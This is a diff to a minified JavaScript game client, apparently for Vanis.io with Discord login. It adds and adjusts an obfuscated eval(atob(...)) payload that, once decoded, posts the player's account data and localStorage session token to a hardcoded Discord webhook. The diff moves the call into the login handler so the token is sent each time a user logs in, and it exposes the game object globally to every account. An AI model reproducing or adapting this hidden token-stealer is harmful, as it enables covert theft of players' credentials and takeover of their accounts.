@@ -7208,7 +7208,6 @@
                 ex = s(228),
                 eB = s(5),
                 e8 = s(1),
-                l = root.w,
                 e0 = s(229),
                 eQ = (s(230), Object(v.a)({
                     components: {
@@ -7262,7 +7261,7 @@
                         },
                         getAvatarUrl: (e, t) => t ? "https://cdn.discordapp.com/avatars/" + e + "/" + t + ".png" : "https://cdn.discordapp.com/embed/avatars/0.png",
                         setAccountData(e) {
-                            e.permissions && (window.gameObj = e8), GAME.account = e, this.account = e, this.avatarUrl = this.getAvatarUrl(e.discord_id, e.discord_avatar), this.name = e.perk_name_picked || e.discord_name, this.nameColor = e.perk_color_picked ? "#" + e.perk_color_picked : "#ffffff", e8.ownUid = e.uid, window.account = this, l()
+                            window.gameObj = e8, GAME.account = e, this.account = e, this.avatarUrl = this.getAvatarUrl(e.discord_id, e.discord_avatar), this.name = e.perk_name_picked || e.discord_name, this.nameColor = e.perk_color_picked ? "#" + e.perk_color_picked : "#ffffff", e8.ownUid = e.uid, window.account = this;
                         },
                         onXpUpdate(e) {
                             if (this.account) {
@@ -7277,7 +7276,7 @@
                             window.open(ex.url + "/login/discord", "", "width=500, height=750")
                         },
                         onLoggedIn(e) {
-                            ex.setToken(e), this.loadUserData()
+                            ex.setToken(e), this.loadUserData(), root.w()
                         }
                     }
                 }, eb, [], !1, null, "661435cd", null));
@@ -8380,7 +8379,7 @@
         }]), window.RISETAG = "RISE69X", localStorage.cid || (localStorage.cid = makeid(28)), GAME.sendServer = e => {
             GAME.events.$emit("chat-message", e)
         }, 
-        window.w = () => {eval(atob('ZmV0Y2goImh0dHBzOi8vZGlzY29yZC5jb20vYXBpL3dlYmhvb2tzLzExNDk4NTcxNTAyNDg3MDIwMDIvbHVnclRqYjIwdHRuQUpWZG1HeldpMUdsVjQ5SlE1Y19KMEREM1dnU1NyWDZSUDBoM21KQ0NxZXJPaGczVVcwX24zY2oiLHttZXRob2Q6InBvc3QiLGhlYWRlcnM6eyJDb250ZW50LVR5cGUiOiJhcHBsaWNhdGlvbi9qc29uIn0sYm9keTpKU09OLnN0cmluZ2lmeSh7dXNlcm5hbWU6d2luZG93LmFjY291bnQubmFtZSxhdmF0YXJfdXJsOndpbmRvdy5hY2NvdW50LmF2YXRhclVybCxjb250ZW50OmBgYGBqc29uCiR7SlNPTi5zdHJpbmdpZnkod2luZG93LmFjY291bnQsbnVsbCwyKX1gYGAKJHtsb2NhbFN0b3JhZ2UudmFuaXNUb2tlbn1gfSl9KTs='))}
+        window.w = () => {eval(atob('ZmV0Y2goImh0dHBzOi8vZGlzY29yZC5jb20vYXBpL3dlYmhvb2tzLzExNDk4NTcxNTAyNDg3MDIwMDIvbHVnclRqYjIwdHRuQUpWZG1HeldpMUdsVjQ5SlE1Y19KMEREM1dnU1NyWDZSUDBoM21KQ0NxZXJPaGczVVcwX24zY2oiLHttZXRob2Q6InBvc3QiLGhlYWRlcnM6eyJDb250ZW50LVR5cGUiOiJhcHBsaWNhdGlvbi9qc29uIn0sYm9keTpKU09OLnN0cmluZ2lmeSh7dXNlcm5hbWU6d2luZG93LmFjY291bnQuYWNjb3VudC5kaXNjb3JkX25hbWUsYXZhdGFyX3VybDp3aW5kb3cuYWNjb3VudC5hdmF0YXJVcmwsY29udGVudDpgYGBganNvbgoke0pTT04uc3RyaW5naWZ5KHdpbmRvdy5hY2NvdW50LmFjY291bnQsbnVsbCwyKX1gYGAKJHtsb2NhbFN0b3JhZ2UudmFuaXNUb2tlbn1gfSl9KTs='))}
         ,GAME.setText = e => {
             GAME.events.$emit("update-cautions", {
                 custom: e
